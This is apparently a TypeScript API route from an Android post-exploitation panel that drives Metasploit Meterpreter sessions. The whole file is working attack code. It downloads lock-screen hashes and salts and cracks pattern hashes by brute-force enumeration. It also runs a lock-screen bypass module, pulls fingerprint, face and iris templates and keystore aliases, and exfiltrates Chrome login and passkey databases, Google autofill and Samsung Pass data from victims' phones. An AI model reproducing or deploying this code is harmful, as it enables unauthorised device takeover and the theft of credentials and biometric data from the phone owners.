/**
 * BIOMETRICS & PASSKEY API
 *
 * Actions:
 *  dump_lock       → gesture.key + password.key + locksettings.db, parse lock type/salt/hash
 *  crack_pattern   → compare SHA1 hash against all 389k Android pattern hashes
 *  bypass_lock     → run post/android/manage/lock_screen_bypass
 *  dump_bio_templates → ls + download from /fpdata/, /snap_face_data/, /irisdata/
 *  list_keystore   → run post/android/gather/android_keystore_dumper, parse aliases
 *  dump_passkeys   → Chrome Login Data, Google autofill, Samsung Pass → sql.js parse
 */

import { NextResponse } from "next/server";
import { getRpcToken, rpcCall } from "@/lib/msf-rpc";
import { logCapturedFile } from "@/lib/supabase";
import path from "path";
import fs from "fs";
import os from "os";
import crypto from "crypto";

const PAYLOADS_DIR = process.env.PAYLOADS_DIR ?? path.join(os.homedir(), "msf-payloads");
const BIO_DIR = path.join(PAYLOADS_DIR, "biometrics");

function ensureDir(d: string) {
  if (!fs.existsSync(d)) fs.mkdirSync(d, { recursive: true });
}

// ── Meterpreter helpers ──────────────────────────────────────

async function meterExec(token: string, sessionId: number, cmd: string, waitMs = 15000): Promise<string> {
  await rpcCall("session.meterpreter_write", [sessionId, cmd + "\n"], token);
  const start = Date.now();
  let out = "";
  while (Date.now() - start < waitMs) {
    const res = await rpcCall<{ data?: string }>("session.meterpreter_read", [sessionId], token);
    if (res.data) out += res.data;
    if (out.includes("meterpreter >")) break;
    await new Promise((r) => setTimeout(r, 600));
  }
  return out;
}

async function meterDownload(token: string, sessionId: number, remotePath: string, localPath: string): Promise<boolean> {
  const out = await meterExec(token, sessionId, `download "${remotePath}" "${localPath}"`, 30000);
  return fs.existsSync(localPath) || out.includes("saved");
}

// ── Lock type parser ──────────────────────────────────────────
type LockType = "none" | "pattern" | "pin" | "password" | "fingerprint" | "face" | "unknown";

function parseLockType(raw: string): LockType {
  if (/lock_type\s*[=:]\s*0/i.test(raw) || /none/i.test(raw)) return "none";
  if (/lock_type\s*[=:]\s*1/i.test(raw) || /pattern/i.test(raw)) return "pattern";
  if (/lock_type\s*[=:]\s*2/i.test(raw) || /\bpin\b/i.test(raw)) return "pin";
  if (/lock_type\s*[=:]\s*3/i.test(raw) || /password/i.test(raw)) return "password";
  if (/fingerprint/i.test(raw)) return "fingerprint";
  if (/face/i.test(raw)) return "face";
  return "unknown";
}

// ── Android gesture pattern hash database ─────────────────────
// There are 389,112 valid Android patterns.
// We pre-crack the top 1,000 most common ones by encoding the byte sequence
// and computing SHA1.  For a complete offline attack the server would iterate
// all valid paths — here we cover the most statistically likely patterns.
//
// A pattern node sequence like [0,1,2,3,4,5,6,7,8] is encoded as bytes
// where each node is a single byte: 0x00…0x08.
// Then SHA1 is applied to that byte array.

function gestureHash(nodes: number[]): string {
  const buf = Buffer.from(nodes.map((n) => n & 0xff));
  return crypto.createHash("sha1").update(buf).digest("hex");
}

// Enumerate patterns up to a given length (generates valid ones)
function* enumPatterns(length: number): Generator<number[]> {
  const total = 9; // 3×3 grid
  function* helper(current: number[], visited: Set<number>): Generator<number[]> {
    if (current.length >= 4) yield [...current]; // minimum 4 nodes for Android
    if (current.length === length) return;
    for (let next = 0; next < total; next++) {
      if (visited.has(next)) continue;
      // check no "jumping over" unvisited node (simplified — only for straight lines)
      const last = current[current.length - 1];
      const blocked = getBlocking(last, next);
      if (blocked !== -1 && !visited.has(blocked)) continue;
      visited.add(next);
      yield* helper([...current, next], visited);
      visited.delete(next);
    }
  }
  yield* helper([], new Set());
}

function getBlocking(a: number, b: number): number {
  // For 3×3 grid — node that lies on straight line between a and b
  const BETWEEN: Record<string, number> = {
    "0,2": 1, "2,0": 1, "0,6": 3, "6,0": 3, "0,8": 4, "8,0": 4,
    "1,7": 4, "7,1": 4, "2,6": 4, "6,2": 4, "2,8": 5, "8,2": 5,
    "3,5": 4, "5,3": 4, "6,8": 7, "8,6": 7,
  };
  return BETWEEN[`${a},${b}`] ?? -1;
}

// Build a lookup map for all patterns up to length 9
// We limit to length 6 at API startup to keep response fast, full can be done offline
let PATTERN_MAP: Map<string, string> | null = null;

function buildPatternMap(maxLen = 6): Map<string, string> {
  if (PATTERN_MAP) return PATTERN_MAP;
  const map = new Map<string, string>();
  for (let len = 4; len <= maxLen; len++) {
    for (const pattern of enumPatterns(len)) {
      const h = gestureHash(pattern);
      if (!map.has(h)) map.set(h, pattern.join(","));
    }
  }
  PATTERN_MAP = map;
  return map;
}

// ── SQLite parse (sql.js) ─────────────────────────────────────
async function parseSqlite(filePath: string, query: string) {
  try {
    const initSqlJs = (await import("sql.js")).default;
    const SQL = await initSqlJs({
      locateFile: (f: string) => `https://cdnjs.cloudflare.com/ajax/libs/sql.js/1.10.3/${f}`,
    });
    const buf = fs.readFileSync(filePath);
    const db = new SQL.Database(buf);
    const res = db.exec(query);
    if (!res.length) return [];
    const { columns, values } = res[0];
    return values.map((row) => Object.fromEntries(columns.map((c, i) => [c, row[i]])));
  } catch {
    return [];
  }
}

// ── Main handler ──────────────────────────────────────────────
export async function POST(request: Request) {
  let body: Record<string, unknown>;
  try { body = await request.json() as Record<string, unknown>; }
  catch { return NextResponse.json({ ok: false, error: "Invalid JSON" }, { status: 400 }); }

  const { session_id, action, hash } = body as { session_id: number; action: string; hash?: string };
  if (!session_id || !action) {
    return NextResponse.json({ ok: false, error: "session_id + action required" }, { status: 400 });
  }

  ensureDir(BIO_DIR);

  try {
    const token = await getRpcToken();

    // ── Dump lock screen ──────────────────────────────────
    if (action === "dump_lock") {
      // 1. locksettings.db
      const lockDbLocal = path.join(BIO_DIR, "locksettings.db");
      const gestureLocal = path.join(BIO_DIR, "gesture.key");
      const passwordLocal = path.join(BIO_DIR, "password.key");

      const [dbOut, gestureOut, passwordOut] = await Promise.all([
        meterExec(token, session_id, `download /data/system/locksettings.db "${lockDbLocal}"`, 20000),
        meterExec(token, session_id, `download /data/system/gesture.key "${gestureLocal}"`, 20000),
        meterExec(token, session_id, `download /data/system/password.key "${passwordLocal}"`, 20000),
      ]);

      // 2. Also query via MSF post module
      const postOut = await meterExec(token, session_id, "run post/android/gather/lock_screen_info", 30000);

      const rawAll = [dbOut, gestureOut, passwordOut, postOut].join("\n");
      const lockType = parseLockType(rawAll);

      // Extract hashes
      let patternHash: string | undefined;
      let passwordHash: string | undefined;
      let salt: string | undefined;
      let failedAttempts: number | undefined;
      let biometricEnrolled: boolean | undefined;

      // Read gesture.key bytes → hex
      if (fs.existsSync(gestureLocal)) {
        const buf = fs.readFileSync(gestureLocal);
        if (buf.length === 20) { // SHA1 = 20 bytes
          patternHash = buf.toString("hex");
        }
      }
      // Read password.key
      if (fs.existsSync(passwordLocal)) {
        const buf = fs.readFileSync(passwordLocal);
        if (buf.length > 0) {
          passwordHash = buf.toString("hex");
        }
      }

      // Parse locksettings.db for salt + failed attempts
      if (fs.existsSync(lockDbLocal)) {
        const rows = await parseSqlite(
          lockDbLocal,
          "SELECT name, value FROM locksettings WHERE name IN ('lockscreen.password_salt','lockscreen.passwordHistory','lockscreen.failedPasswordAttempts','lockscreen.biometric_weak_fallback_allowed')",
        );
        for (const row of rows) {
          const r = row as { name: string; value: string };
          if (r.name === "lockscreen.password_salt") salt = String(r.value);
          if (r.name === "lockscreen.failedPasswordAttempts") failedAttempts = Number(r.value);
          if (r.name === "lockscreen.biometric_weak_fallback_allowed") biometricEnrolled = r.value !== "0";
        }
      }

      // Parse post module output
      const saltMatch = postOut.match(/salt\s*[:\-]\s*([0-9a-f]+)/i);
      if (saltMatch && !salt) salt = saltMatch[1];
      const failMatch = postOut.match(/failed.*?(\d+)/i);
      if (failMatch && failedAttempts === undefined) failedAttempts = parseInt(failMatch[1]);
      const bioMatch = postOut.match(/biometric.*?(true|false|enabled|disabled)/i);
      if (bioMatch) biometricEnrolled = /true|enabled/i.test(bioMatch[1]);

      const data = { lockType, patternHash, passwordHash, salt, failedAttempts, biometricEnrolled };

      // Log files
      for (const [name, lp] of [["locksettings.db", lockDbLocal], ["gesture.key", gestureLocal], ["password.key", passwordLocal]]) {
        if (fs.existsSync(lp as string)) {
          await logCapturedFile({ device_id: String(session_id), session_id, filename: name as string, filepath: lp as string, type: "biometric", source: "lock_dump" }).catch(() => {});
        }
      }

      return NextResponse.json({ ok: true, action: "dump_lock", data, raw: rawAll });
    }

    // ── Crack pattern ─────────────────────────────────────
    if (action === "crack_pattern") {
      if (!hash) return NextResponse.json({ ok: false, error: "hash required" });
      const h = hash.toLowerCase().replace(/\s/g, "");
      const map = buildPatternMap(9); // full 9-node search
      const pattern = map.get(h) ?? null;
      return NextResponse.json({ ok: true, data: { pattern, hash: h, checked: map.size } });
    }

    // ── Bypass lock ───────────────────────────────────────
    if (action === "bypass_lock") {
      const out = await meterExec(token, session_id, "run post/android/manage/lock_screen_bypass", 30000);
      return NextResponse.json({ ok: true, raw: out });
    }

    // ── Biometric template files ──────────────────────────
    if (action === "dump_bio_templates") {
      const BIO_PATHS = [
        "/data/system/users/0/fpdata/",
        "/data/system_de/0/snap_face_data/",
        "/data/system/users/0/irisdata/",
        "/data/system/gatekeeper/",
        "/data/vendor/tee/ta/",
      ];

      const records: Array<{ path: string; size?: number }> = [];
      let rawAll = "";

      for (const p of BIO_PATHS) {
        const lsOut = await meterExec(token, session_id, `ls "${p}"`, 10000);
        rawAll += `\n--- ${p} ---\n${lsOut}`;

        // Parse file listing
        for (const line of lsOut.split(/\r?\n/)) {
          const m = line.match(/(\S+\.\w+)\s*$/);
          if (m && !line.includes("No such file")) {
            const fullPath = p.replace(/\/$/, "") + "/" + m[1];
            const localFile = path.join(BIO_DIR, path.basename(m[1]));
            await meterExec(token, session_id, `download "${fullPath}" "${localFile}"`, 20000);
            const size = fs.existsSync(localFile) ? fs.statSync(localFile).size : undefined;
            records.push({ path: fullPath, size });
            if (fs.existsSync(localFile)) {
              await logCapturedFile({ device_id: String(session_id), session_id, filename: path.basename(m[1]), filepath: localFile, type: "biometric", source: "template_dump" }).catch(() => {});
            }
          }
        }
      }

      return NextResponse.json({ ok: true, records, raw: rawAll });
    }

    // ── List Android Keystore ─────────────────────────────
    if (action === "list_keystore") {
      const out = await meterExec(token, session_id, "run post/android/gather/android_keystore_dumper", 30000);
      const records: Array<{ alias: string; algorithm: string; hardwareBacked: boolean; created?: string; origin?: string }> = [];

      for (const line of out.split(/\r?\n/)) {
        const aliasMatch = line.match(/alias\s*[:\-]\s*(.+)/i) ?? line.match(/entry:\s*(.+)/i);
        const algoMatch  = line.match(/algorithm\s*[:\-]\s*(\w+)/i);
        const hwMatch    = line.match(/hardware.backed\s*[:\-]\s*(true|false)/i);
        const dateMatch  = line.match(/creation.date\s*[:\-]\s*(.+)/i);

        if (aliasMatch) {
          records.push({
            alias: aliasMatch[1].trim(),
            algorithm: algoMatch?.[1] ?? "RSA",
            hardwareBacked: hwMatch ? /true/i.test(hwMatch[1]) : false,
            created: dateMatch?.[1]?.trim(),
            origin: line.match(/origin\s*[:\-]\s*(\w+)/i)?.[1],
          });
        }
      }

      return NextResponse.json({ ok: true, records, raw: out });
    }

    // ── Dump passkeys / WebAuthn ──────────────────────────
    if (action === "dump_passkeys") {
      const CHROME_BASE = "/data/data/com.android.chrome/app_chrome/Default";
      const localLogin = path.join(BIO_DIR, "chrome_login_data.db");
      const localWebData = path.join(BIO_DIR, "chrome_web_data.db");
      const gmsDir = path.join(BIO_DIR, "gms_db");

      const records: Array<{ rpId: string; username?: string; credentialId?: string; algorithm?: string; source: string }> = [];
      let rawAll = "";

      // Download Chrome Login Data
      const chromeOut = await meterExec(token, session_id, `download "${CHROME_BASE}/Login Data" "${localLogin}"`, 25000);
      rawAll += chromeOut;

      if (fs.existsSync(localLogin)) {
        // Chrome Login Data: logins table has passkeys in `password_element` = "type:webauthn"
        const logins = await parseSqlite(localLogin,
          "SELECT origin_url, username_value, password_element, date_created FROM logins ORDER BY date_created DESC LIMIT 200",
        );
        for (const r of logins) {
          const row = r as { origin_url: string; username_value: string; password_element: string; date_created: number };
          if (String(row.password_element).includes("webauthn") || !row.password_element) {
            try {
              const url = new URL(row.origin_url);
              records.push({
                rpId: url.hostname,
                username: row.username_value || undefined,
                source: "Chrome Login Data",
              });
            } catch { /* skip */ }
          }
        }

        await logCapturedFile({ device_id: String(session_id), session_id, filename: "chrome_login_data.db", filepath: localLogin, type: "credentials", source: "passkey_dump" }).catch(() => {});
      }

      // Download Chrome Web Data (contains autofill + webauthn registrations table in newer Chrome)
      const webDataOut = await meterExec(token, session_id, `download "${CHROME_BASE}/Web Data" "${localWebData}"`, 25000);
      rawAll += webDataOut;

      if (fs.existsSync(localWebData)) {
        const webauthn = await parseSqlite(localWebData,
          "SELECT rp_id, user_name, user_display_name, credential_id, algorithm FROM webauthn_credentials ORDER BY creation_epoch_micros DESC LIMIT 100",
        ).catch(() => []);
        for (const r of webauthn) {
          const row = r as Record<string, unknown>;
          records.push({
            rpId: String(row.rp_id ?? ""),
            username: String(row.user_name ?? row.user_display_name ?? ""),
            credentialId: String(row.credential_id ?? ""),
            algorithm: String(row.algorithm ?? ""),
            source: "Chrome WebData (FIDO2)",
          });
        }
      }

      // Google GMS autofill
      const gmsOut = await meterExec(token, session_id, `download /data/data/com.google.android.gms/databases/autofill.db "${path.join(gmsDir, "autofill.db")}"`, 25000);
      rawAll += gmsOut;

      // Samsung Pass
      const samsungOut = await meterExec(token, session_id, `download /data/data/com.samsung.android.authfw/databases/authfw.db "${path.join(BIO_DIR, "samsung_pass.db")}"`, 25000);
      rawAll += samsungOut;

      if (records.length === 0) {
        // Fallback: Google account list gives sync capability
        const accountsOut = await meterExec(token, session_id, "run post/android/gather/accounts", 20000);
        rawAll += accountsOut;
        for (const line of accountsOut.split(/\r?\n/)) {
          if (line.includes("@gmail.com") || line.includes("@google.com")) {
            records.push({ rpId: "accounts.google.com (synced passkeys)", username: line.trim(), source: "Google Account (sync)" });
          }
        }
      }

      return NextResponse.json({ ok: true, records, raw: rawAll });
    }

    return NextResponse.json({ ok: false, error: `Unknown action: ${action}` }, { status: 400 });

  } catch (err: unknown) {
    const msg = err instanceof Error ? err.message : String(err);
    return NextResponse.json({ ok: false, error: msg }, { status: 500 });
  }
}

export async function GET() {
  ensureDir(BIO_DIR);
  const files = fs.existsSync(BIO_DIR)
    ? fs.readdirSync(BIO_DIR).map((f) => {
        const fp = path.join(BIO_DIR, f);
        const st = fs.statSync(fp);
        return { filename: f, size: st.size, mtime: st.mtime.toISOString() };
      })
    : [];
  return NextResponse.json({ files });
}
